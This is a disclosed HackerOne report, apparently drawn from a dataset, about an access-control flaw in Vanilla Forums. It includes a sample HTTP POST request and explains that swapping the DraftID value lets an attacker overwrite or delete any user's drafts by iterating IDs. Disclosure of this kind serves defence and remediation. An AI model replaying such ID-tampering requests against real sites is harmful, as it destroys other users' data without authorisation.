---
source: hackerone
dataset: elamaran619/hackerone_disclosed_reports
h1_id: '258201'
original_report_id: '258201'
title: Overwrite Drafts of Everyone
weakness: Improper Access Control - Generic
team_handle: vanilla
created_at: '2017-08-09T09:20:00.569Z'
disclosed_at: '2018-07-23T14:32:24.073Z'
has_bounty: true
visibility: full
substate: resolved
vote_count: 22
tags:
- hackerone
- improper-access-control-generic
---

# Overwrite Drafts of Everyone

## Metadata

- HackerOne Report ID: 258201
- Weakness: Improper Access Control - Generic
- Program: vanilla
- Disclosed At: 2018-07-23T14:32:24.073Z
- Has Bounty: Yes
- Visibility: full
- Substate: resolved

## Original Report

###Description:
-----------
Users have option to save drafts before doing comment on posts or discussions, where `DraftID` parameter is get passed to keep the draft record and if attacker replace this id with any existing id it will simple overwrite that record without checking the permission he that user is allowed to access that draft or not.

###Sample Post request:
````http
POST /post/comment/?discussionid=17598 HTTP/1.1
Host: open.vanillaforums.com
User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; rv:54.0) Gecko/20100101 Firefox/54.0
Accept: application/json, text/javascript, */*; q=0.01
Accept-Language: en-US,en;q=0.5
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
X-Requested-With: XMLHttpRequest
Referer: https://open.vanillaforums.com/discussion/17598/have-you-noticed-the-new-like-button-on-vanillaforums-org
Content-Length: 185
Cookie: <Redacted>
DNT: 1
Connection: close

TransientKey=JnZOUDaSl3N7Qviz&SomeRequiredField=&DiscussionID=17598&CommentID=&DraftID=&Format=Markdown&Body=aasdsa&DeliveryType=VIEW&DeliveryMethod=JSON&Type=Draft&LastCommentID=247998
```
+ Replace/add value to `DraftID` with any existing values of any user and it will simply overwrite that data.

{F210848}

###Exploitability: 
+ Attacker can iterate through all the ID and overwrite/remove the drafts of other users.

###Possible Fix:
-----------
+ Check for permission. 


Please let me know if any more info needed !

-------------

__*- Geekboy!*__

## Extracted Security Notes

### Likely Vulnerability Class

*Leave this section for future enrichment.*

### Likely Root Cause

*Leave this section for future enrichment.*

### Potential Impact

*Leave this section for future enrichment.*

### Defensive Test Cases

*Leave this section for future enrichment.*

### Remediation Ideas

*Leave this section for future enrichment.*
